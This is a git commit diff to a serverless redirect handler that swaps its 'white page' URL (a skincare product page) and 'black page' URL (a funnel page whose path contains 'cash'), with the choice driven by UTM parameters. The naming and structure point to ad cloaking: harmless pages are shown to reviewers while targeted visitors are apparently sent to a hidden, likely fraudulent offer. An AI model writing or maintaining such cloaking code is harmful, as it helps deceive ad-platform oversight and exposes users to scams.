f2fadf127c20ba8cb121dc20a2e14cab545db773
Hassan86639 <hassan86639@gmail.com>
2025-09-28 22:55:22 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.german-operator.de/collections/shirts/products/si-vis-pacem-para-bellum-premium-shirt";
-    const blackPageURL = "https://gymboreeusk.myfunnelish.com/Stimulus";
+    const whitePageURL = "https://boopbeauty.co.uk/products/optimal-skin-pro-serum-copy";
+    const blackPageURL = "https://gymboreeusk.myfunnelish.com/cash-1735686017557538-1759052013535697";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
